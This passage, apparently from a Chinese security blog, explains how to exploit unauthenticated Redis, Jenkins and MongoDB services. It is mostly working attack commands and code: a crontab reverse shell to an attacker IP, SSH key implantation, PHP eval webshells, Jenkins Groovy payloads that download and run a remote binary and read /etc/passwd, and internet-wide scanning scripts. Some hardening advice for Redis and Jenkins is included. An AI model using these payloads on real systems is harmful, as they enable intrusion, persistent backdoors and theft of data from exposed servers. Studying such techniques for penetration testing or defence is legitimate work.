<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）cp redis.conf .&#x2F;src&#x2F;redis.conf</span><br><span class="line">    （2）bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0</span><br><span class="line">    （3）protected-mode设为no</span><br><span class="line">    （4）启动redis-server  ------&gt;   .&#x2F;src&#x2F;redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><strong>(2). 攻击者喜欢的命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）查看信息：info</span><br><span class="line">    （2）删除所有数据库内容：flushall</span><br><span class="line">    （3）刷新数据库：flushdb</span><br><span class="line">    （4）看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">    （5）设置变量：set test &quot;who am i&quot;</span><br><span class="line">    （6）config set dir dirpath 设置路径等配置</span><br><span class="line">    （7）config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">    （8）save保存</span><br><span class="line">    （9）get 变量，查看变量名称</span><br></pre></td></tr></table></figure>

<p><strong>(3). msf下利用模块</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;redis&#x2F;file_upload </span><br><span class="line">    auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_login</span><br><span class="line">    auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server</span><br></pre></td></tr></table></figure>

<p><strong>(4). nmap及获取信息</strong><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7fd90ipj31e10u04qp.jpg" alt="img"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7frjaewj319r0u0x4r.jpg" alt="img"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b02a29da-5195-1.png" alt="img"></p>
<p>匿名扫描脚本:<a href="https://xz.aliyun.com/t/528" target="_blank" rel="noopener">https://xz.aliyun.com/t/528</a></p>
<h4 id="2-攻击的几种方法"><a href="#2-攻击的几种方法" class="headerlink" title="2.攻击的几种方法"></a><strong>2.攻击的几种方法</strong></h4><p>参考:<br><a href="http://www.cnblogs.com/xiaozi/p/7568272.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaozi/p/7568272.html</a><br><a href="https://evi1cg.me/archives/hackredis.html" target="_blank" rel="noopener">https://evi1cg.me/archives/hackredis.html</a></p>
<p><strong>(1).利用计划任务执行命令反弹shell</strong></p>
<p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br>先在自己的服务器上监听一个端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvnp 7999</span><br></pre></td></tr></table></figure>

<p>然后执行命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~## redis-cli -h 192.168.63.130</span><br><span class="line">      192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.63.128&#x2F;7999 0&gt;&amp;1\n&quot;</span><br><span class="line">      192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">      192.168.63.130:6379&gt; config set dbfilename root</span><br><span class="line">      192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>ps:此处使用bash反弹shell，也可使用其他方法<br><strong>(2).写ssh-keygen公钥然后使用私钥登陆</strong></p>
<p>在以下条件下，可以利用此方法</p>
<p>1、Redis服务使用ROOT账号启动</p>
<p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。<br>首先在本地生成一对密钥：<br><code>root@kali:~/.ssh## ssh-keygen -t rsa</code></p>
<p>然后redis执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h x.x.x.x -x set crackit</span><br><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">     &gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">     &gt; config get dir</span><br><span class="line">     &gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">     &gt; save</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure>

<p>或者如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2&#x2F;XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv&#x2F;RE&#x2F;eHYgoav&#x2F;k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG&#x2F;d4TwrIj1sRz4&#x2F;GeiWG6BZ8uQND9G+Vqbx&#x2F;+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b&#x2F;ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX&#x2F;GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure>

<p><strong>(3).往web物理路径写webshell</strong></p>
<p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">      192.168.63.130:6379&gt; config set dbfilename shell.php</span><br><span class="line">      192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">      192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>即可将shell写入web目录(web目录根据实际情况</p>
<p><strong>(4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</strong><br>From:<a href="http://www.00theway.org/2017/03/27/redis_exp/" target="_blank" rel="noopener">http://www.00theway.org/2017/03/27/redis_exp/</a><br>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local function hex2bin(hexstr)</span><br><span class="line">    local str &#x3D; &quot;&quot;</span><br><span class="line">    for i &#x3D; 1, string.len(hexstr) - 1, 2 do</span><br><span class="line">        local doublebytestr &#x3D; string.sub(hexstr, i, i+1);</span><br><span class="line">        local n &#x3D; tonumber(doublebytestr, 16);</span><br><span class="line">        if 0 &#x3D;&#x3D; n then</span><br><span class="line">            str &#x3D; str .. &#39;\00&#39;</span><br><span class="line">        else</span><br><span class="line">            str &#x3D; str .. string.format(&quot;%c&quot;, n)</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    return str</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local dir &#x3D; redis.call(&#39;config&#39;,&#39;get&#39;,&#39;dir&#39;)</span><br><span class="line">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dir&#39;,&#39;&#x2F;tmp&#x2F;&#39;)</span><br><span class="line">local dbfilename &#x3D; redis.call(&#39;config&#39;,&#39;get&#39;,&#39;dbfilename&#39;)</span><br><span class="line">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dbfilename&#39;,&#39;t&#39;)</span><br><span class="line">local rdbcompress &#x3D; redis.call(&#39;config&#39;,&#39;get&#39;,&#39;rdbcompression&#39;)</span><br><span class="line">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;rdbcompression&#39;,&#39;no&#39;)</span><br><span class="line">redis.call(&#39;flushall&#39;)</span><br><span class="line"></span><br><span class="line">local data &#x3D; &#39;1a2b3c4d5e6f1223344556677890aa&#39;</span><br><span class="line">redis.call(&#39;set&#39;,&#39;data&#39;,hex2bin(&#39;0a7c7c7c&#39;..data..&#39;7c7c7c0a&#39;))</span><br><span class="line">local rst &#x3D; &#123;&#125;</span><br><span class="line">rst[1] &#x3D; &#39;server default config&#39;</span><br><span class="line">rst[2] &#x3D; &#39;dir:&#39;..dir[2]</span><br><span class="line">rst[3] &#x3D; &#39;dbfilename:&#39;..dbfilename[2]</span><br><span class="line">rst[4] &#x3D; &#39;rdbcompression:&#39;..rdbcompress[2]</span><br><span class="line">return rst</span><br><span class="line">保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</span><br></pre></td></tr></table></figure>

<p><code>redis-cli --eval a.lua -h *.*.*.*</code><br>由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli save -h *.*.*.*</span><br><span class="line">redis-cli config set dir *** -h *.*.*.*</span><br><span class="line">redis-cli config set dbfilename *** -h *.*.*.*</span><br><span class="line">redis-cli config set rdbcompression * -h *.*.*.*</span><br></pre></td></tr></table></figure>

<p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了<code>|||</code>作为提取最终文件的标识）。</p>
<p><code>*/1 * * * * python -c &#39;open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])&#39;</code><br>/tmp/rst为最终上传的文件。</p>
<p><strong>(5).傻瓜式python脚本</strong><br>From:<a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行命令</span><br><span class="line">需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。</span><br><span class="line">    python redis_exp.py --host *.*.*.* -c &#39;id&#39;</span><br><span class="line"></span><br><span class="line">上传文件</span><br><span class="line">上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据</span><br><span class="line">    python redis_exp.py --host *.*.*.* -l &#x2F;data&#x2F;payload.py -r &#x2F;tmp&#x2F;p.py</span><br><span class="line"></span><br><span class="line">暴力猜解目录</span><br><span class="line">不需要root权限，利用 config set dir &#39;xx&#39; 报错进行目录猜解</span><br><span class="line">    python redis_exp.py --host *.*.*.* -f p.txt</span><br><span class="line"></span><br><span class="line">可以通过-p参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7gz4d41j315209gq4i.jpg" alt="img"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b05af56a-5195-1.png" alt="img"></p>
<p><strong>(6).批量验证</strong><br>From:<a href="https://github.com/Ridter/hackredis" target="_blank" rel="noopener">https://github.com/Ridter/hackredis</a></p>
<h4 id="3-防护措施"><a href="#3-防护措施" class="headerlink" title="3.防护措施"></a><strong>3.防护措施</strong></h4><p><strong>1.禁止一些高危命令</strong></p>
<p>修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">      rename-command CONFIG   &quot;&quot;</span><br><span class="line">      rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>2.以低权限运行 Redis 服务</strong></p>
<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br><code>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</code><br><strong>3.为 Redis 添加密码验证</strong></p>
<p>修改 redis.conf 文件，添加<br><code>requirepass mypassword</code><br><strong>4.禁止外网访问 Redis</strong></p>
<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><code>bind 127.0.0.1</code><br><strong>5.保证 authorized_keys 文件的安全</strong></p>
<p>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><code>## chmod 400 ~/.ssh/authorized_keys</code></p>
<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br><code>## chattr +i ~/.ssh/authorized_keys</code></p>
<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br><code>## chattr +i ~/.ssh</code></p>
<p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br><strong>6.修改默认端口</strong></p>
<p>指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字<br><code>## redis-server --port 6380</code></p>
<p><strong>7.防火墙</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 6379 -j DROP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Jenkins未授权访问"><a href="#0x02-Jenkins未授权访问" class="headerlink" title="0x02 Jenkins未授权访问"></a>0x02 Jenkins未授权访问</h2><h4 id="1-扫描探测-1"><a href="#1-扫描探测-1" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p>弱口令扫描:<a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> 或者 <a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a><br>From: <a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2166.html</a><br>CVE-2017-1000353:<a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3171</a><br>提示: script/manage 是管理页面<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7hyaw1gj31db0u04gf.jpg" alt="img"></p>
<h4 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2. 攻击利用"></a>2. 攻击利用</h4><p><strong>2.1 反弹shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;wget http:&#x2F;&#x2F;192.168.3.131:8081&#x2F;exp -P &#x2F;tmp&#x2F;&quot;.execute().text</span><br><span class="line">println &quot;chmod +x &#x2F;tmp&#x2F;exp&quot;.execute().text</span><br><span class="line">println &quot;&#x2F;tmp&#x2F;exp&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p>或者直接通过 Terminal+Plugin<br><a href="https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin" target="_blank" rel="noopener">https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin</a></p>
<p><strong>2.2 写webshell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. println &quot;wget http:&#x2F;&#x2F;shell.com&#x2F;shell.txt -P &#x2F;var&#x2F;www&#x2F;html&#x2F;&quot;.execute().text</span><br><span class="line"></span><br><span class="line">2. new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;);</span><br><span class="line"></span><br><span class="line">3. </span><br><span class="line">def webshell &#x3D; &#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;</span><br><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&quot;$webshell&quot;);</span><br><span class="line"></span><br><span class="line">4. </span><br><span class="line">def execute(cmd) &#123;</span><br><span class="line">def proc &#x3D; cmd.execute()</span><br><span class="line">proc.waitFor()</span><br><span class="line">&#125;</span><br><span class="line">execute( [ &#39;bash&#39;, &#39;-c&#39;, &#39;echo -n &quot;&lt;?php @eval($&quot; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39; ] )</span><br><span class="line">execute( [ &#39;bash&#39;, &#39;-c&#39;, &#39;echo &quot;_POST[shell]);?&gt;&quot; &gt;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39; ] )</span><br><span class="line">&#x2F;&#x2F;参数-n 不要在最后自动换行</span><br></pre></td></tr></table></figure>

<p><strong>2.3 读文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line">text &#x3D; new File(&quot;&#x2F;etc&#x2F;passwd&quot;).getText();</span><br><span class="line"></span><br><span class="line">out.print text</span><br><span class="line"></span><br><span class="line">&#125; catch(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.4 执行命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def sout &#x3D; new StringBuilder(), serr &#x3D; new StringBuilder()</span><br><span class="line">def proc &#x3D; &#39;cat &#x2F;etc&#x2F;passwd&#39;.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(1000)</span><br><span class="line">println &quot;out&gt; $sout err&gt; $serr&quot;</span><br></pre></td></tr></table></figure>

<p><strong>回显注意点</strong></p>
<ul>
<li>Result: 0 表示成功写入</li>
<li>Result: 1 表示目录不存在或者权限不足 写入失败</li>
<li>Result: 2 表示构造有异常 写入失败</li>
</ul>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7iw12uij313z0d4niy.jpg" alt="image-20200720100155148"></p>
<p>jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限<br>某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）</p>
<h4 id="3-模拟低权限"><a href="#3-模拟低权限" class="headerlink" title="3. 模拟低权限"></a><strong>3. 模拟低权限</strong></h4><h6 id="省略掉注册并且安装plugin的傻瓜式操作"><a href="#省略掉注册并且安装plugin的傻瓜式操作" class="headerlink" title="省略掉注册并且安装plugin的傻瓜式操作"></a>省略掉注册并且安装plugin的傻瓜式操作</h6><p>默认安装的情况下，匿名用户是没有任何权限的，这里修改配置，让匿名用户只拥有 查看Job、Job Configure 权限</p>
<p>1.点击 管理(Manage Jenkins) - Configure Global Security</p>
<p>2.在 添加用户/组(User/group to add): 填入当前登录的用户名，然后点击 Add，移到最右侧，点击 ✔️，让用户拥有所有权限<br>此步非常重要，不然保存后会导致 admin is missing the Overall/Read permission 错误,如下图所示<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jao333j31bw0u04fi.jpg" alt="img"></p>
<p>3.然后访问 <a href="http://127.0.0.1:8080/newJob" target="_blank" rel="noopener">http://127.0.0.1:8080/newJob</a> ,名称填 Test，类型选择 构建一个自由风格的软件项目(Freestyle project )后点击 Save,如下图所示代表创建成功<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jn8iu2j31um0lywnq.jpg" alt="img"></p>
<p>4.新建一个无痕窗口,通过匿名访问看到有配置权限<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jyzv9ej31bw0u0wvu.jpg" alt="img"><br>点击 配置(Configure)，在 Build 部分选择 Execute shell</p>
<p>在 Command 中填入要执行的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">uname -a </span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7khfjehj31vc0mcwlw.jpg" alt="img"></p>
<p>5.通过查看 Configure 页面的选项，得知在 构建触发器(Build Triggers) 部分可以设置任务 Build 的触发规则，其中有一个 Build periodically，可以通过类似 Crontab 时间规则来触发，这里填入 <code>*/1 * * * *</code> 即每分钟执行一次 Build，点击 Save<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7l049boj31ry0qgwri.jpg" alt="img"></p>
<p>6.回到 Job 页面，等待一会，在左侧 Build History 可以看到，每分钟都会执行一次 Build，这里点击查看 Console Output<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7lp6avzj31ze0tmwt3.jpg" alt="img"><br>命令执行成功<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7mj6ag6j31bw0u07wh.jpg" alt="img"></p>
<p>匿名用户是没有 Build 权限，即 Job 的页面中是没有 立即构建(Build Now) 按钮，所以这里无法通过点击 立即构建 来触发命令的执行。</p>
<h4 id="4-防护措施"><a href="#4-防护措施" class="headerlink" title="4. 防护措施"></a><strong>4. 防护措施</strong></h4><ul>
<li>在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。</li>
<li>建议您不要将管理后台开放到互联网上。您可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。您可以根据业务发布情况仅开放* 需要对外用户提供的服务，并控制好访问源IP。</li>
</ul>
<h2 id="0x03-MongoDB未授权访问"><a href="#0x03-MongoDB未授权访问" class="headerlink" title="0x03 MongoDB未授权访问"></a>0x03 MongoDB未授权访问</h2><p>MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p>
<ul>
<li>使用默认 mongod 命令启动 Mongodb</li>
<li>机器可以被公网访问</li>
<li>在公网上开放了 Mongodb 端口</li>
<li>数据库隐私泄露</li>
<li>数据库被清空</li>
<li>数据库运行缓慢</li>
</ul>
<h4 id="1-扫描探测-2"><a href="#1-扫描探测-2" class="headerlink" title="1. 扫描探测"></a><strong>1. 扫描探测</strong></h4><p>下载：<a href="http://nmap.org/svn/scripts/mongodb-info.nse" target="_blank" rel="noopener">http://nmap.org/svn/scripts/mongodb-info.nse</a><br><code>nmap -p 27017 --script mongodb-info &lt;ip&gt;</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7n3llvmj31s90u0hdt.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;mongodb.conf</span><br><span class="line">dbpath &#x3D; &#x2F;data&#x2F;</span><br><span class="line">logpath &#x3D; &#x2F;var&#x2F;logs&#x2F;mongodb.log</span><br><span class="line">##port &#x3D; 27017</span><br><span class="line">##fork &#x3D; true</span><br><span class="line">bind_ip &#x3D; 0.0.0.0</span><br><span class="line"></span><br><span class="line">.&#x2F;mongod –config mongodb.conf &#x2F;&#x2F;启动mongodb加载配置mongodb.conf</span><br></pre></td></tr></table></figure>

<p><strong>1.1 基础</strong><br><a href="https://www.jianshu.com/p/8bf26effa737" target="_blank" rel="noopener">https://www.jianshu.com/p/8bf26effa737</a><br><a href="http://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/mongodb/mongodb-tutorial.html</a><br><a href="https://itbilu.com/database/mongo/E1tWQz4_e.html" target="_blank" rel="noopener">https://itbilu.com/database/mongo/E1tWQz4_e.html</a></p>
<p><strong>1.2 批量扫描未授权</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import pymongo</span><br><span class="line"></span><br><span class="line">ipcons &#x3D; []</span><br><span class="line">def Scanner(ip):</span><br><span class="line">    global ipcons</span><br><span class="line">    sk &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sk.settimeout(0.3)</span><br><span class="line">    try:</span><br><span class="line">        sk.connect((ip,27017))</span><br><span class="line">        ipcons.append(ip)</span><br><span class="line">        sk.close()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def ip2num(ip):</span><br><span class="line">    ip&#x3D;[int(x) for x in ip.split(&#39;.&#39;)]</span><br><span class="line">    return ip[0] &lt;&lt;24 | ip[1]&lt;&lt;16 | ip[2]&lt;&lt;8 |ip[3]</span><br><span class="line"></span><br><span class="line">def num2ip(num):</span><br><span class="line">    return &#39;%s.%s.%s.%s&#39; %( (num &amp; 0xff000000) &gt;&gt;24,</span><br><span class="line">                                (num &amp; 0x00ff0000) &gt;&gt;16,</span><br><span class="line">                                (num &amp; 0x0000ff00) &gt;&gt;8,</span><br><span class="line">                                num &amp; 0x000000ff )</span><br><span class="line"></span><br><span class="line">def get_ip(ip):</span><br><span class="line">    start,end &#x3D; [ip2num(x) for x in ip.split(&#39; &#39;) ]</span><br><span class="line">    return [ num2ip(num) for num in range(start,end+1) if num &amp; 0xff ]</span><br><span class="line"></span><br><span class="line">startIp &#x3D; sys.argv[1]</span><br><span class="line">endIp &#x3D; sys.argv[2]</span><br><span class="line">iplist &#x3D; get_ip(sys.argv[1]+&quot; &quot;+sys.argv[2])</span><br><span class="line">for i in iplist:</span><br><span class="line">    Scanner(i)</span><br><span class="line"></span><br><span class="line">def connMon(ip_addr):</span><br><span class="line">    print &#39; Connect mongodb: &#39; + ip_addr + &#39;:27017&#39;</span><br><span class="line">    try:</span><br><span class="line">        conn &#x3D; pymongo.MongoClient(ip_addr,27017,socketTimeoutMS&#x3D;3000)</span><br><span class="line">        dbname &#x3D; conn.database_names()</span><br><span class="line">        print &quot;success&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;error&quot;</span><br><span class="line"></span><br><span class="line">print ipcons   </span><br><span class="line">for ipaddr in ipcons:</span><br><span class="line">    connMon(ipaddr)</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>1.3 shodan扫描脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">## -*- coding: UTF-8 -*-</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">@Author：joy_nick</span><br><span class="line">@博客：http:&#x2F;&#x2F;byd.dropsec.xyz&#x2F;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">import shodan</span><br><span class="line">import os</span><br><span class="line">iplist &#x3D; []</span><br><span class="line">ip_list &#x3D; []</span><br><span class="line">shodan_ip_list &#x3D; []</span><br><span class="line">def shodanSearch(keywords):</span><br><span class="line">    SHODAN_API_KEY &#x3D; &quot;your key&quot;</span><br><span class="line">    api &#x3D; shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line">    total &#x3D; 0</span><br><span class="line">    try:</span><br><span class="line">        results &#x3D; api.search(keywords)</span><br><span class="line">        total &#x3D; int(results[&#39;total&#39;])</span><br><span class="line">        for result in results[&#39;matches&#39;]:</span><br><span class="line">            ##iplist.append(&#123;&quot;ip&quot;:result[&#39;ip_str&#39;],&quot;country&quot;:result[&#39;location&#39;][&#39;country_name&#39;]&#125;)</span><br><span class="line">            iplist.append(result[&#39;ip_str&#39;])</span><br><span class="line">            for i in range(len(iplist)):</span><br><span class="line">                ip_list &#x3D; iplist[i].encode(&#39;utf-8&#39;)</span><br><span class="line">                shodan_ip_list.append(ip_list)</span><br><span class="line">                s &#x3D; &#39;\n&#39;.join(shodan_ip_list)</span><br><span class="line">                with open(&#39;shodan_ip_list.txt&#39;,&#39;w&#39;) as output:</span><br><span class="line">                    output.write(s)</span><br><span class="line">    except shodan.APIError, e:</span><br><span class="line">        print &#39;Error: %s&#39; % e</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    shodanSearch(&#39;redis&#39;)</span><br></pre></td></tr></table></figure>

<p>查询操作<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7nh31zzj30xj0kln2k.jpg" alt="img"></p>
<h4 id="2-爆破脚本"><a href="#2-爆破脚本" class="headerlink" title="2. 爆破脚本"></a><strong>2. 爆破脚本</strong></h4><p><a href="https://github.com/netxfly/x-crack" target="_blank" rel="noopener">https://github.com/netxfly/x-crack</a><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ns7c1hj31gx0q1n1z.jpg" alt="img"><strong>3. 攻击脚本</strong></p>
